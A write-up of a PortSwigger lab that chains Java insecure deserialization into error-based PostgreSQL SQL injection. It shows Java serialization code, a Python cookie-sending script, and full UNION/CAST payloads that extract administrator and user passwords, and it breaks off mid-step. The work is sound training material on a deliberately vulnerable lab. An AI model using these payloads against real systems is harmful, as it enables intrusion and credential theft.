# Developing a custom gadget chain for Java deserialization

## Introduction

Welcome to my another writeup! In this Portswigger Labs [lab](https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-developing-a-custom-gadget-chain-for-java-deserialization), you'll learn: Developing a custom gadget chain for Java deserialization! Without further ado, let's dive in.

- Overall difficulty for me (From 1-10 stars): ★★★★★★☆☆☆☆

## Background

This lab uses a serialization-based session mechanism. If you can construct a suitable gadget chain, you can exploit this lab's [insecure deserialization](https://portswigger.net/web-security/deserialization) to obtain the administrator's password.

To solve the lab, gain access to the source code and use it to construct a gadget chain to obtain the administrator's password. Then, log in as the `administrator` and delete Carlos's account.

You can log in to your own account using the following credentials: `wiener:peter`

Note that solving this lab requires basic familiarity with another topic that we've covered on the [Web Security Academy](https://portswigger.net/web-security).

## Exploitation

**Login as user `wiener`:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Insecure-Deserialization/Deserial-8/images/Pasted%20image%2020230112165300.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Insecure-Deserialization/Deserial-8/images/Pasted%20image%2020230112165311.png)

**Burp Suite HTTP history:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Insecure-Deserialization/Deserial-8/images/Pasted%20image%2020230112165326.png)

**When we successfully logged in, it'll set a new session cookie:**
```
rO0ABXNyAC9sYWIuYWN0aW9ucy5jb21tb24uc2VyaWFsaXphYmxlLkFjY2Vzc1Rva2VuVXNlchlR/OUSJ6mBAgACTAALYWNjZXNzVG9rZW50ABJMamF2YS9sYW5nL1N0cmluZztMAAh1c2VybmFtZXEAfgABeHB0ACBiemhpYTZ6NDNxNHR2YXc1NGJzdnFkb2N4czg2YjFrdHQABndpZW5lcg==
```

It has `=` in the last 2 characters of the cookie, which means it's encoded in base64.

**Let's decode that:**
```shell
╭─root at siunam in ~/ctf/Portswigger-Labs/Insecure-Deserialization 2023-01-12 - 16:57:04
╰─○ echo 'rO0ABXNyAC9sYWIuYWN0aW9ucy5jb21tb24uc2VyaWFsaXphYmxlLkFjY2Vzc1Rva2VuVXNlchlR/OUSJ6mBAgACTAALYWNjZXNzVG9rZW50ABJMamF2YS9sYW5nL1N0cmluZztMAAh1c2VybmFtZXEAfgABeHB0ACBiemhpYTZ6NDNxNHR2YXc1NGJzdnFkb2N4czg2YjFrdHQABndpZW5lcg==' | base64 -d | xxd      
00000000: aced 0005 7372 002f 6c61 622e 6163 7469  ....sr./lab.acti
00000010: 6f6e 732e 636f 6d6d 6f6e 2e73 6572 6961  ons.common.seria
00000020: 6c69 7a61 626c 652e 4163 6365 7373 546f  lizable.AccessTo
00000030: 6b65 6e55 7365 7219 51fc e512 27a9 8102  kenUser.Q...'...
00000040: 0002 4c00 0b61 6363 6573 7354 6f6b 656e  ..L..accessToken
00000050: 7400 124c 6a61 7661 2f6c 616e 672f 5374  t..Ljava/lang/St
00000060: 7269 6e67 3b4c 0008 7573 6572 6e61 6d65  ring;L..username
00000070: 7100 7e00 0178 7074 0020 627a 6869 6136  q.~..xpt. bzhia6
00000080: 7a34 3371 3474 7661 7735 3462 7376 7164  z43q4tvaw54bsvqd
00000090: 6f63 7873 3836 6231 6b74 7400 0677 6965  ocxs86b1ktt..wie
000000a0: 6e65 72                                  ner
```

**As you can see, the first 2 bytes are `ac ed`, which is a serialized Java objects.**

**View source page:**
```html
<!-- <a href=/backup/AccessTokenUser.java>Example user</a> -->
```

In here, we see there is an `<a>` element, which points to `/backup/AccessTokenUser.java`.

**Let's download that Java source file via `wget`:**
```shell
╭─root at siunam in ~/ctf/Portswigger-Labs/Insecure-Deserialization 2023-01-12 - 17:00:03
╰─○ wget https://0abb008404e187bcc1f4800f00c80011.web-security-academy.net/backup/AccessTokenUser.java
```

**`AccessTokenUser.java`:**
```java
package data.session.token;

import java.io.Serializable;

public class AccessTokenUser implements Serializable
{
    private final String username;
    private final String accessToken;

    public AccessTokenUser(String username, String accessToken)
    {
        this.username = username;
        this.accessToken = accessToken;
    }

    public String getUsername()
    {
        return username;
    }

    public String getAccessToken()
    {
        return accessToken;
    }
}
```

Let's break it down:

- There is a class called `AccessTokenUser`, which is serializable.
- This class has 2 attributes: `username`, `accessToken`
- This class also has 2 methods: `getUsername()`, `getAccessToken()`

**Also, we found another Java file in `/backup`:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Insecure-Deserialization/Deserial-8/images/Pasted%20image%2020230112180916.png)

```shell
╭─root at siunam in ~/ctf/Portswigger-Labs/Insecure-Deserialization 2023-01-12 - 18:09:31
╰─○ wget https://0a7b0097047787b9c18cbcba0069007b.web-security-academy.net/backup/ProductTemplate.java
```

**`ProductTemplate.java`:**
```java
package data.productcatalog;

import common.db.JdbcConnectionBuilder;

import java.io.IOException;
import java.io.ObjectInputStream;
import java.io.Serializable;
import java.sql.Connection;
import java.sql.ResultSet;
import java.sql.SQLException;
import java.sql.Statement;

public class ProductTemplate implements Serializable
{
    static final long serialVersionUID = 1L;

    private final String id;
    private transient Product product;

    public ProductTemplate(String id)
    {
        this.id = id;
    }

    private void readObject(ObjectInputStream inputStream) throws IOException, ClassNotFoundException
    {
        inputStream.defaultReadObject();

        JdbcConnectionBuilder connectionBuilder = JdbcConnectionBuilder.from(
                "org.postgresql.Driver",
                "postgresql",
                "localhost",
                5432,
                "postgres",
                "postgres",
                "password"
        ).withAutoCommit();
        try
        {
            Connection connect = connectionBuilder.connect(30);
            String sql = String.format("SELECT * FROM products WHERE id = '%s' LIMIT 1", id);
            Statement statement = connect.createStatement();
            ResultSet resultSet = statement.executeQuery(sql);
            if (!resultSet.next())
            {
                return;
            }
            product = Product.from(resultSet);
        }
        catch (SQLException e)
        {
            throw new IOException(e);
        }
    }

    public String getId()
    {
        return id;
    }

    public Product getProduct()
    {
        return product;
    }
}
```

In this Java code:

- The `ProductTemplate.readObject()` method is passing the template's `id` attribute into a SQL query

**Hmm... Let's write some Java codes to generate a Java serialized object:**

**`productcatalog/Product.java`:**
```java
package data.productcatalog;
class Product {}
```

**`productcatalog/ProductTemplate.java`:**
```java
package data.productcatalog;

import java.io.Serializable;

public class ProductTemplate implements Serializable
{
    static final long serialVersionUID = 1L;

    private final String id;
    private transient Product product;

    public ProductTemplate(String id)
    {
        this.id = id;
    }

    public String getId()
    {
        return id;
    }
}
```

**`Main.java`:**
```java
import data.productcatalog.ProductTemplate;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.io.Serializable;
import java.util.Base64;

class Main {
    public static void main(String[] args) throws Exception {
        ProductTemplate originalObject = new ProductTemplate("PAYLOAD_HERE");

        String serializedObject = serialize(originalObject);
        System.out.println("Serialized object: " + serializedObject);

        ProductTemplate deserializedObject = deserialize(serializedObject);
        System.out.println("Deserialized id: " + deserializedObject.getId());
    }

    private static String serialize(Serializable obj) throws Exception {
        ByteArrayOutputStream baos = new ByteArrayOutputStream(512);
        try (ObjectOutputStream out = new ObjectOutputStream(baos)) {
            out.writeObject(obj);
        }
        return Base64.getEncoder().encodeToString(baos.toByteArray());
    }

    private static <T> T deserialize(String base64SerializedObj) throws Exception {
        try (ObjectInputStream in = new ObjectInputStream(new ByteArrayInputStream(Base64.getDecoder().decode(base64SerializedObj)))) {
            @SuppressWarnings("unchecked")
            T obj = (T) in.readObject();
            return obj;
        }
    }
}
```

**We can compile and run it:**
```shell
╭─root at siunam in ~/ctf/Portswigger-Labs/Insecure-Deserialization 2023-01-12 - 18:24:30
╰─○ javac Main.java 
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
╭─root at siunam in ~/ctf/Portswigger-Labs/Insecure-Deserialization 2023-01-12 - 18:24:31
╰─○ java Main       
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
Serialized object: rO0ABXNyACNkYXRhLnByb2R1Y3RjYXRhbG9nLlByb2R1Y3RUZW1wbGF0ZQAAAAAAAAABAgABTAACaWR0ABJMamF2YS9sYW5nL1N0cmluZzt4cHQADFBBWUxPQURfSEVSRQ==
Deserialized id: PAYLOAD_HERE
```

**In here, since the `ProductTemplate.java` is parsing the `id` attribute (it's under our control) to the SQL query, we can try to test SQL injection!**

First, we need to confirm it's vulnerable to SQL injection.

**We can do that by triggering an error:**
```java
ProductTemplate originalObject = new ProductTemplate("'");
```

```shell
╭─root at siunam in ~/ctf/Portswigger-Labs/Insecure-Deserialization 2023-01-12 - 18:25:16
╰─○ javac Main.java 
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
╭─root at siunam in ~/ctf/Portswigger-Labs/Insecure-Deserialization 2023-01-12 - 18:28:55
╰─○ java Main
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
Serialized object: rO0ABXNyACNkYXRhLnByb2R1Y3RjYXRhbG9nLlByb2R1Y3RUZW1wbGF0ZQAAAAAAAAABAgABTAACaWR0ABJMamF2YS9sYW5nL1N0cmluZzt4cHQAASc=
Deserialized id: '
```

**Copy that base64 encoded string, paste it to the session cookie, and refresh the page:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Insecure-Deserialization/Deserial-8/images/Pasted%20image%2020230112183039.png)

We successfully triggered an SQL syntax error! Which means it's vulnerable to SQL injection!

We also knew that the DBMS (Database Management System) is PostgreSQL from the `ProductTemplate.java` file.

**Next, we need to find out how many columns in the table.**

**To automate things, I'll write a python script:**
```py
#!/usr/bin/env python3

import requests
from bs4 import BeautifulSoup

class exploit():
    def __init__(self, url):
        self.url = url
        
    def sendRequest(self, cookie):
        requestResult = requests.get(self.url, cookies=cookie)
        soup = BeautifulSoup(requestResult.text, 'html.parser')
        print(soup.find_all('div', class_='container')[1].get_text().strip())

def main():
    url = 'https://0ad3005a043b8fd3c07bccd80011000a.web-security-academy.net/'

    Exploit = exploit(url)

    cookie = {
        'session': 'rO0ABXNyACNkYXRhLnByb2R1Y3RjYXRhbG9nLlByb2R1Y3RUZW1wbGF0ZQAAAAAAAAABAgABTAACaWR0ABJMamF2YS9sYW5nL1N0cmluZzt4cHQAOScgVU5JT04gQUxMIFNFTEVDVCBOVUxMLE5VTEwsTlVMTCxOVUxMLE5VTEwsTlVMTCxOVUxMLS0gLQ=='
    }

    Exploit.sendRequest(cookie)

if __name__ == '__main__':
    main()
```

```shell
╭─root at siunam in ~/ctf/Portswigger-Labs/Insecure-Deserialization 2023-01-12 - 18:49:07
╰─○ javac Main.java   
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
╭─root at siunam in ~/ctf/Portswigger-Labs/Insecure-Deserialization 2023-01-12 - 18:50:58
╰─○ java Main         
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
Serialized object: rO0ABXNyACNkYXRhLnByb2R1Y3RjYXRhbG9nLlByb2R1Y3RUZW1wbGF0ZQAAAAAAAAABAgABTAACaWR0ABJMamF2YS9sYW5nL1N0cmluZzt4cHQAOScgVU5JT04gQUxMIFNFTEVDVCBOVUxMLE5VTEwsTlVMTCxOVUxMLE5VTEwsTlVMTCxOVUxMLS0gLQ==
Deserialized id: ' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -
╭─root at siunam in ~/ctf/Portswigger-Labs/Insecure-Deserialization 2023-01-12 - 18:51:00
╰─○ python3 exploit.py
Internal Server Error
java.io.IOException: org.postgresql.util.PSQLException: ERROR: each UNION query must have the same number of columns
  Position: 55
```

```shell
╭─root at siunam in ~/ctf/Portswigger-Labs/Insecure-Deserialization 2023-01-12 - 18:51:13
╰─○ javac Main.java   
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
╭─root at siunam in ~/ctf/Portswigger-Labs/Insecure-Deserialization 2023-01-12 - 18:51:50
╰─○ java Main         
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
Serialized object: rO0ABXNyACNkYXRhLnByb2R1Y3RjYXRhbG9nLlByb2R1Y3RUZW1wbGF0ZQAAAAAAAAABAgABTAACaWR0ABJMamF2YS9sYW5nL1N0cmluZzt4cHQAPicgVU5JT04gQUxMIFNFTEVDVCBOVUxMLE5VTEwsTlVMTCxOVUxMLE5VTEwsTlVMTCxOVUxMLE5VTEwtLSAt
Deserialized id: ' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -
╭─root at siunam in ~/ctf/Portswigger-Labs/Insecure-Deserialization 2023-01-12 - 18:51:52
╰─○ python3 exploit.py
Internal Server Error
java.lang.ClassCastException: Cannot cast data.productcatalog.ProductTemplate to lab.actions.common.serializable.AccessTokenUser
```

**As you can see, when we SELECT 7 columns, it outputs doesn't have the same number of columns. However, 8 columns doesn't have error.**

That being said, the table has 8 columns.

**Then, we need to know which columns are accepting string data type:**
```shell
╭─root at siunam in ~/ctf/Portswigger-Labs/Insecure-Deserialization 2023-01-12 - 18:52:03
╰─○ javac Main.java   
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
╭─root at siunam in ~/ctf/Portswigger-Labs/Insecure-Deserialization 2023-01-12 - 18:54:28
╰─○ java Main         
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
Serialized object: rO0ABXNyACNkYXRhLnByb2R1Y3RjYXRhbG9nLlByb2R1Y3RUZW1wbGF0ZQAAAAAAAAABAgABTAACaWR0ABJMamF2YS9sYW5nL1N0cmluZzt4cHQAZicgVU5JT04gQUxMIFNFTEVDVCAnc3RyaW5nMScsJ3N0cmluZzInLCdzdHJpbmczJywnc3RyaW5nNCcsJ3N0cmluZzUnLCdzdHJpbmc2Jywnc3RyaW5nNycsJ3N0cmluZzgnLS0gLQ==
Deserialized id: ' UNION ALL SELECT 'string1','string2','string3','string4','string5','string6','string7','string8'-- -
╭─root at siunam in ~/ctf/Portswigger-Labs/Insecure-Deserialization 2023-01-12 - 18:54:29
╰─○ python3 exploit.py
Internal Server Error
java.io.IOException: org.postgresql.util.PSQLException: ERROR: invalid input syntax for type integer: "string4"
  Position: 85
```

4th column is integer.

```shell
╭─root at siunam in ~/ctf/Portswigger-Labs/Insecure-Deserialization 2023-01-12 - 18:55:32
╰─○ javac Main.java 
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
╭─root at siunam in ~/ctf/Portswigger-Labs/Insecure-Deserialization 2023-01-12 - 18:55:46
╰─○ java Main       
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
Serialized object: rO0ABXNyACNkYXRhLnByb2R1Y3RjYXRhbG9nLlByb2R1Y3RUZW1wbGF0ZQAAAAAAAAABAgABTAACaWR0ABJMamF2YS9sYW5nL1N0cmluZzt4cHQAXicgVU5JT04gQUxMIFNFTEVDVCAnc3RyaW5nMScsJ3N0cmluZzInLCdzdHJpbmczJywxLCdzdHJpbmc1Jywnc3RyaW5nNicsJ3N0cmluZzcnLCdzdHJpbmc4Jy0tIC0=
Deserialized id: ' UNION ALL SELECT 'string1','string2','string3',1,'string5','string6','string7','string8'-- -
╭─root at siunam in ~/ctf/Portswigger-Labs/Insecure-Deserialization 2023-01-12 - 18:55:47
╰─○ python3 exploit.py
Internal Server Error
java.io.IOException: org.postgresql.util.PSQLException: ERROR: invalid input syntax for type integer: "string5"
  Position: 87
```

5th column is integer.

```shell
╭─root at siunam in ~/ctf/Portswigger-Labs/Insecure-Deserialization 2023-01-12 - 18:56:00
╰─○ javac Main.java   
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
╭─root at siunam in ~/ctf/Portswigger-Labs/Insecure-Deserialization 2023-01-12 - 18:56:40
╰─○ java Main         
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
Serialized object: rO0ABXNyACNkYXRhLnByb2R1Y3RjYXRhbG9nLlByb2R1Y3RUZW1wbGF0ZQAAAAAAAAABAgABTAACaWR0ABJMamF2YS9sYW5nL1N0cmluZzt4cHQAVicgVU5JT04gQUxMIFNFTEVDVCAnc3RyaW5nMScsJ3N0cmluZzInLCdzdHJpbmczJywxLDEsJ3N0cmluZzYnLCdzdHJpbmc3Jywnc3RyaW5nOCctLSAt
Deserialized id: ' UNION ALL SELECT 'string1','string2','string3',1,1,'string6','string7','string8'-- -
╭─root at siunam in ~/ctf/Portswigger-Labs/Insecure-Deserialization 2023-01-12 - 18:56:41
╰─○ python3 exploit.py
Internal Server Error
java.io.IOException: org.postgresql.util.PSQLException: ERROR: invalid input syntax for type integer: "string7"
  Position: 99
```

7th column is integer.

```shell
╭─root at siunam in ~/ctf/Portswigger-Labs/Insecure-Deserialization 2023-01-12 - 18:56:50
╰─○ javac Main.java   
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
╭─root at siunam in ~/ctf/Portswigger-Labs/Insecure-Deserialization 2023-01-12 - 18:57:14
╰─○ java Main         
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
Serialized object: rO0ABXNyACNkYXRhLnByb2R1Y3RjYXRhbG9nLlByb2R1Y3RUZW1wbGF0ZQAAAAAAAAABAgABTAACaWR0ABJMamF2YS9sYW5nL1N0cmluZzt4cHQATicgVU5JT04gQUxMIFNFTEVDVCAnc3RyaW5nMScsJ3N0cmluZzInLCdzdHJpbmczJywxLDEsJ3N0cmluZzYnLDEsJ3N0cmluZzgnLS0gLQ==
Deserialized id: ' UNION ALL SELECT 'string1','string2','string3',1,1,'string6',1,'string8'-- -
╭─root at siunam in ~/ctf/Portswigger-Labs/Insecure-Deserialization 2023-01-12 - 18:57:16
╰─○ python3 exploit.py
Internal Server Error
java.lang.ClassCastException: Cannot cast data.productcatalog.ProductTemplate to lab.actions.common.serializable.AccessTokenUser
```

- Accepting data type string column: 1, 2, 3, 6, 8

**Now, since the data type error is reflected to the web page, we can leverage that to enumerate the entire database. It's also known as Error-based SQL injection:**
```shell
╭─root at siunam in ~/ctf/Portswigger-Labs/Insecure-Deserialization 2023-01-12 - 19:02:52
╰─○ javac Main.java   
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
╭─root at siunam in ~/ctf/Portswigger-Labs/Insecure-Deserialization 2023-01-12 - 19:05:05
╰─○ java Main         
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
Serialized object: rO0ABXNyACNkYXRhLnByb2R1Y3RjYXRhbG9nLlByb2R1Y3RUZW1wbGF0ZQAAAAAAAAABAgABTAACaWR0ABJMamF2YS9sYW5nL1N0cmluZzt4cHQAQycgVU5JT04gQUxMIFNFTEVDVCBOVUxMLE5VTEwsTlVMTCwnc3RyaW5nNCcsTlVMTCxOVUxMLE5VTEwsTlVMTC0tIC0=
Deserialized id: ' UNION ALL SELECT NULL,NULL,NULL,'string4',NULL,NULL,NULL,NULL-- -
╭─root at siunam in ~/ctf/Portswigger-Labs/Insecure-Deserialization 2023-01-12 - 19:05:07
╰─○ python3 exploit.py
Internal Server Error
java.io.IOException: org.postgresql.util.PSQLException: ERROR: invalid input syntax for type integer: "string4"
  Position: 70
```

**Let's try to find PostgreSQL version!**
```shell
╭─root at siunam in ~/ctf/Portswigger-Labs/Insecure-Deserialization 2023-01-12 - 19:06:40
╰─○ javac Main.java   
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
╭─root at siunam in ~/ctf/Portswigger-Labs/Insecure-Deserialization 2023-01-12 - 19:08:12
╰─○ java Main         
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
Serialized object: rO0ABXNyACNkYXRhLnByb2R1Y3RjYXRhbG9nLlByb2R1Y3RUZW1wbGF0ZQAAAAAAAAABAgABTAACaWR0ABJMamF2YS9sYW5nL1N0cmluZzt4cHQAUCcgVU5JT04gQUxMIFNFTEVDVCBOVUxMLE5VTEwsTlVMTCxDQVNUKHZlcnNpb24oKSBBUyBJTlQpLE5VTEwsTlVMTCxOVUxMLE5VTEwtLSAt
Deserialized id: ' UNION ALL SELECT NULL,NULL,NULL,CAST(version() AS INT),NULL,NULL,NULL,NULL-- -
╭─root at siunam in ~/ctf/Portswigger-Labs/Insecure-Deserialization 2023-01-12 - 19:08:14
╰─○ python3 exploit.py
Internal Server Error
java.io.IOException: org.postgresql.util.PSQLException: ERROR: invalid input syntax for type integer: "PostgreSQL 12.12 (Ubuntu 12.12-0ubuntu0.20.04.1) on x86_64-pc-linux-gnu, compiled by gcc (Ubuntu 9.4.0-1ubuntu1~20.04.1) 9.4.0, 64-bit"
```

- PostgreSQL information: PostgreSQL 12.12 (Ubuntu 12.12-0ubuntu0.20.04.1)

**Armed with above information, we can start to extract the `administrator`'s password!**

**Listing all tables:**
```shell
╭─root at siunam in ~/ctf/Portswigger-Labs/Insecure-Deserialization 2023-01-12 - 19:16:08
╰─○ javac Main.java   
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
╭─root at siunam in ~/ctf/Portswigger-Labs/Insecure-Deserialization 2023-01-12 - 19:19:35
╰─○ java Main         
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
Serialized object: rO0ABXNyACNkYXRhLnByb2R1Y3RjYXRhbG9nLlByb2R1Y3RUZW1wbGF0ZQAAAAAAAAABAgABTAACaWR0ABJMamF2YS9sYW5nL1N0cmluZzt4cHQAiicgVU5JT04gQUxMIFNFTEVDVCBOVUxMLE5VTEwsTlVMTCxDQVNUKChTRUxFQ1QgdGFibGVfbmFtZSBGUk9NIGluZm9ybWF0aW9uX3NjaGVtYS50YWJsZXMgTElNSVQgMSBPRkZTRVQgMCkgQVMgSU5UKSxOVUxMLE5VTEwsTlVMTCxOVUxMLS0gLQ==
Deserialized id: ' UNION ALL SELECT NULL,NULL,NULL,CAST((SELECT table_name FROM information_schema.tables LIMIT 1 OFFSET 0) AS INT),NULL,NULL,NULL,NULL-- -
╭─root at siunam in ~/ctf/Portswigger-Labs/Insecure-Deserialization 2023-01-12 - 19:19:37
╰─○ python3 exploit.py
Internal Server Error
java.io.IOException: org.postgresql.util.PSQLException: ERROR: invalid input syntax for type integer: "users"
```

- Found table `users`

**Listing table `users`'s columns:**
```shell
╭─root at siunam in ~/ctf/Portswigger-Labs/Insecure-Deserialization 2023-01-12 - 19:20:18
╰─○ javac Main.java   
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
╭─root at siunam in ~/ctf/Portswigger-Labs/Insecure-Deserialization 2023-01-12 - 19:21:33
╰─○ java Main         
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
Serialized object: rO0ABXNyACNkYXRhLnByb2R1Y3RjYXRhbG9nLlByb2R1Y3RUZW1wbGF0ZQAAAAAAAAABAgABTAACaWR0ABJMamF2YS9sYW5nL1N0cmluZzt4cHQApScgVU5JT04gQUxMIFNFTEVDVCBOVUxMLE5VTEwsTlVMTCxDQVNUKChTRUxFQ1QgY29sdW1uX25hbWUgRlJPTSBpbmZvcm1hdGlvbl9zY2hlbWEuY29sdW1ucyBXSEVSRSB0YWJsZV9uYW1lPSd1c2VycycgTElNSVQgMSBPRkZTRVQgMCkgQVMgSU5UKSxOVUxMLE5VTEwsTlVMTCxOVUxMLS0gLQ==
Deserialized id: ' UNION ALL SELECT NULL,NULL,NULL,CAST((SELECT column_name FROM information_schema.columns WHERE table_name='users' LIMIT 1 OFFSET 0) AS INT),NULL,NULL,NULL,NULL-- -
╭─root at siunam in ~/ctf/Portswigger-Labs/Insecure-Deserialization 2023-01-12 - 19:21:35
╰─○ python3 exploit.py
Internal Server Error
java.io.IOException: org.postgresql.util.PSQLException: ERROR: invalid input syntax for type integer: "username"
```

```shell
╭─root at siunam in ~/ctf/Portswigger-Labs/Insecure-Deserialization 2023-01-12 - 19:21:45
╰─○ javac Main.java   
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
╭─root at siunam in ~/ctf/Portswigger-Labs/Insecure-Deserialization 2023-01-12 - 19:22:01
╰─○ java Main         
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
Serialized object: rO0ABXNyACNkYXRhLnByb2R1Y3RjYXRhbG9nLlByb2R1Y3RUZW1wbGF0ZQAAAAAAAAABAgABTAACaWR0ABJMamF2YS9sYW5nL1N0cmluZzt4cHQApScgVU5JT04gQUxMIFNFTEVDVCBOVUxMLE5VTEwsTlVMTCxDQVNUKChTRUxFQ1QgY29sdW1uX25hbWUgRlJPTSBpbmZvcm1hdGlvbl9zY2hlbWEuY29sdW1ucyBXSEVSRSB0YWJsZV9uYW1lPSd1c2VycycgTElNSVQgMSBPRkZTRVQgMSkgQVMgSU5UKSxOVUxMLE5VTEwsTlVMTCxOVUxMLS0gLQ==
Deserialized id: ' UNION ALL SELECT NULL,NULL,NULL,CAST((SELECT column_name FROM information_schema.columns WHERE table_name='users' LIMIT 1 OFFSET 1) AS INT),NULL,NULL,NULL,NULL-- -
╭─root at siunam in ~/ctf/Portswigger-Labs/Insecure-Deserialization 2023-01-12 - 19:22:03
╰─○ python3 exploit.py
Internal Server Error
java.io.IOException: org.postgresql.util.PSQLException: ERROR: invalid input syntax for type integer: "password"
```

- Found table `users`'s column: `username`, `password`

**Finally, extract all data from it:**
```shell
╭─root at siunam in ~/ctf/Portswigger-Labs/Insecure-Deserialization 2023-01-12 - 19:22:36
╰─○ javac Main.java   
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
╭─root at siunam in ~/ctf/Portswigger-Labs/Insecure-Deserialization 2023-01-12 - 19:23:36
╰─○ java Main         
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
Serialized object: rO0ABXNyACNkYXRhLnByb2R1Y3RjYXRhbG9nLlByb2R1Y3RUZW1wbGF0ZQAAAAAAAAABAgABTAACaWR0ABJMamF2YS9sYW5nL1N0cmluZzt4cHQAgycgVU5JT04gQUxMIFNFTEVDVCBOVUxMLE5VTEwsTlVMTCxDQVNUKChTRUxFQ1QgdXNlcm5hbWV8fCc6J3x8cGFzc3dvcmQgRlJPTSB1c2VycyBMSU1JVCAxIE9GRlNFVCAwKSBBUyBJTlQpLE5VTEwsTlVMTCxOVUxMLE5VTEwtLSAt
Deserialized id: ' UNION ALL SELECT NULL,NULL,NULL,CAST((SELECT username||':'||password FROM users LIMIT 1 OFFSET 0) AS INT),NULL,NULL,NULL,NULL-- -
╭─root at siunam in ~/ctf/Portswigger-Labs/Insecure-Deserialization 2023-01-12 - 19:23:37
╰─○ python3 exploit.py
Internal Server Error
java.io.IOException: org.postgresql.util.PSQLException: ERROR: invalid input syntax for type integer: "administrator:cx84ygpvjtb4tjokq2sz"
```

```shell
╭─root at siunam in ~/ctf/Portswigger-Labs/Insecure-Deserialization 2023-01-12 - 19:23:47
╰─○ javac Main.java   
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
╭─root at siunam in ~/ctf/Portswigger-Labs/Insecure-Deserialization 2023-01-12 - 19:24:21
╰─○ java Main         
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
Serialized object: rO0ABXNyACNkYXRhLnByb2R1Y3RjYXRhbG9nLlByb2R1Y3RUZW1wbGF0ZQAAAAAAAAABAgABTAACaWR0ABJMamF2YS9sYW5nL1N0cmluZzt4cHQAgycgVU5JT04gQUxMIFNFTEVDVCBOVUxMLE5VTEwsTlVMTCxDQVNUKChTRUxFQ1QgdXNlcm5hbWV8fCc6J3x8cGFzc3dvcmQgRlJPTSB1c2VycyBMSU1JVCAxIE9GRlNFVCAxKSBBUyBJTlQpLE5VTEwsTlVMTCxOVUxMLE5VTEwtLSAt
Deserialized id: ' UNION ALL SELECT NULL,NULL,NULL,CAST((SELECT username||':'||password FROM users LIMIT 1 OFFSET 1) AS INT),NULL,NULL,NULL,NULL-- -
╭─root at siunam in ~/ctf/Portswigger-Labs/Insecure-Deserialization 2023-01-12 - 19:24:22
╰─○ python3 exploit.py
Internal Server Error
java.io.IOException: org.postgresql.util.PSQLException: ERROR: invalid input syntax for type integer: "carlos:07a3yuaqllqixi7fs9d4"
```

```shell
╭─root at siunam in ~/ctf/Portswigger-Labs/Insecure-Deserialization 2023-01-12 - 19:24:31
╰─○ javac Main.java   
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
╭─root at siunam in ~/ctf/Portswigger-Labs/Insecure-Deserialization 2023-01-12 - 19:24:52
╰─○ java Main         
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
Serialized object: rO0ABXNyACNkYXRhLnByb2R1Y3RjYXRhbG9nLlByb2R1Y3RUZW1wbGF0ZQAAAAAAAAABAgABTAACaWR0ABJMamF2YS9sYW5nL1N0cmluZzt4cHQAgycgVU5JT04gQUxMIFNFTEVDVCBOVUxMLE5VTEwsTlVMTCxDQVNUKChTRUxFQ1QgdXNlcm5hbWV8fCc6J3x8cGFzc3dvcmQgRlJPTSB1c2VycyBMSU1JVCAxIE9GRlNFVCAyKSBBUyBJTlQpLE5VTEwsTlVMTCxOVUxMLE5VTEwtLSAt
